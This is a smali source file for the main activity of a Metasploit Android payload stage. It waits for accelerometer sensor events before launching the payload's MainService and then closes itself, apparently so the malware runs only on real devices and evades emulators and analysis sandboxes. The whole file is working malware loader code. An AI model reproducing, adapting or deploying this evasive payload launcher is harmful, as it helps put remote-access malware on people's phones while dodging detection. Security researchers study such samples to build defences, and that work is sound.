.class public Lcom/metasploit/stage/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

# interfaces
.implements Landroid/hardware/SensorEventListener;


# instance fields
.field ran:I

.field private sensorManager:Landroid/hardware/SensorManager;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 10
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 13
    const/4 v0, 0x0

    iput v0, p0, Lcom/metasploit/stage/MainActivity;->ran:I

    return-void
.end method


# virtual methods
.method public onAccuracyChanged(Landroid/hardware/Sensor;I)V
    .locals 0
    .param p1, "arg0"    # Landroid/hardware/Sensor;
    .param p2, "arg1"    # I

    .line 30
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 18
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 20
    const-string v0, "sensor"

    invoke-virtual {p0, v0}, Lcom/metasploit/stage/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/SensorManager;

    iput-object v0, p0, Lcom/metasploit/stage/MainActivity;->sensorManager:Landroid/hardware/SensorManager;

    .line 22
    nop

    .line 23
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/hardware/SensorManager;->getDefaultSensor(I)Landroid/hardware/Sensor;

    move-result-object v1

    .line 22
    const/4 v2, 0x3

    invoke-virtual {v0, p0, v1, v2}, Landroid/hardware/SensorManager;->registerListener(Landroid/hardware/SensorEventListener;Landroid/hardware/Sensor;I)Z

    .line 24
    return-void
.end method

.method public onSensorChanged(Landroid/hardware/SensorEvent;)V
    .locals 2
    .param p1, "event"    # Landroid/hardware/SensorEvent;

    .line 35
    iget-object v0, p1, Landroid/hardware/SensorEvent;->sensor:Landroid/hardware/Sensor;

    invoke-virtual {v0}, Landroid/hardware/Sensor;->getType()I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    .line 37
    :goto_0
    iget v0, p0, Lcom/metasploit/stage/MainActivity;->ran:I

    if-ge v0, v1, :cond_0

    invoke-static {p0}, Lcom/metasploit/stage/MainService;->startService(Landroid/content/Context;)V

    invoke-virtual {p0}, Lcom/metasploit/stage/MainActivity;->finish()V

    .line 39
    add-int/lit8 v0, v0, 0x1

    iput v0, p0, Lcom/metasploit/stage/MainActivity;->ran:I

    goto :goto_0

    .line 42
    :cond_0
    return-void
.end method

